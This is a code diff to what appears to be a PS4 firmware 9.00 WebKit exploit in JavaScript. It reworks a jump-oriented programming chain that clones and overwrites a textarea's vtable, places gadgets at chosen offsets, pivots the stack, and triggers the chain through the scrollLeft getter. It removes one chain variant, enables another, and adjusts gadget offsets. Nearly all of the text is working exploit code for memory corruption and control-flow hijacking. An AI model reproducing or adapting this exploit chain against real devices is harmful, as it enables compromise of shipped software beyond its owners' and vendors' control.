@@ -80,28 +80,6 @@ let libc_base = null;
 //
 // When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
-const ta_jop1 = `
-mov rdi, qword ptr [rsi + 0x18]
-mov rax, qword ptr [rdi]
-call qword ptr [rax + 0xb8]
-`;
-// Since the method of code redirection we used is via redirecting a call to
-// jump to our JOP chain, we have the return address of the caller on entry.
-//
-// ta_jop1 pushed another object (via the call instruction) but we want no
-// extra objects between the return address and the rbp that will be pushed by
-// jop2 later. So we pop the return address pushed by ta_jop1.
-//
-// This will make pivoting back easy, just "leave; ret".
-const ta_jop2 = `
-pop rsi
-jmp qword ptr [rax + 0x1c]
-`;
-const ta_jop3 = `
-mov rdi, qword ptr [rax + 8]
-mov rax, qword ptr [rdi]
-jmp qword ptr [rax + 0x30]
-`;
 const jop1 = `
 mov rdi, qword ptr [rsi + 0x20]
 mov rax, qword ptr [rdi]
@@ -493,7 +471,7 @@ class Chain900Base extends ChainBase {
 const rop_ta = document.createElement('textarea');
 
 // Chain for PS4 9.00
-/*class Chain900 extends Chain900Base {
+class Chain900 extends Chain900Base {
     constructor() {
         super();
 
@@ -542,8 +520,8 @@ const rop_ta = document.createElement('textarea');
 
         clone_p.write64(0, ta_p.read64(0));
 
-        // 0x1c8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1c8, this.get_gadget(jop1));
+        // 0x1b8 is the offset of the scrollLeft getter native function
+        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
@@ -551,8 +529,8 @@ const rop_ta = document.createElement('textarea');
         this.rax_ptrs = rax_ptrs;
 
         rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x60, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
         // value to pivot rsp to
@@ -574,70 +552,6 @@ const rop_ta = document.createElement('textarea');
 
         // jump to JOP chain
         this.ta_clone.scrollLeft;
-    }
-}
-const Chain = Chain900;*/
-
-class Chain900 extends Chain900Base {
-    constructor() {
-        super();
-
-        const textarea = document.createElement('textarea');
-        this.textarea = textarea;
-        const js_ta = mem.addrof(textarea);
-        const webcore_ta = js_ta.readp(0x18);
-        this.webcore_ta = webcore_ta;
-        // Only offset 0x1c8 will be used when calling the scrollLeft getter
-        // native function (our tests don't crash).
-        //
-        // This implies we don't need to know the exact size of the vtable and
-        // try to copy it as much as possible to avoid a crash due to missing
-        // vtable entries.
-        //
-        // So the rest of the vtable are free for our use.
-        const vtable = new Uint8Array(0x200);
-        const old_vtable_p = webcore_ta.readp(0);
-        this.vtable = vtable;
-        this.old_vtable_p = old_vtable_p;
-
-        // 0x1b8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
-        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
-        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
-
-        // for the JOP chain
-        const rax_ptrs = new Uint8Array(0x100);
-        const rax_ptrs_p = get_view_vector(rax_ptrs);
-        this.rax_ptrs = rax_ptrs;
-
-        //rw.write64(rax_ptrs, 8, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
-        // value to pivot rsp to
-        rw.write64(this.rax_ptrs, 0x18, this.stack_addr);
-
-        const jop_buffer = new Uint8Array(8);
-        const jop_buffer_p = get_view_vector(jop_buffer);
-        this.jop_buffer = jop_buffer;
-
-        rw.write64(jop_buffer, 0, rax_ptrs_p);
-
-        rw.write64(vtable, 8, jop_buffer_p);
-    }
-
-    run() {
-        this.check_stale();
-        this.check_is_empty();
-        this.check_is_branching();
-
-        // change vtable
-        this.webcore_ta.write64(0, get_view_vector(this.vtable));
-        // jump to JOP chain
-        this.textarea.scrollLeft;
-        // restore vtable
-        this.webcore_ta.write64(1, this.old_vtable_p);
     }
 }
 const Chain = Chain900;
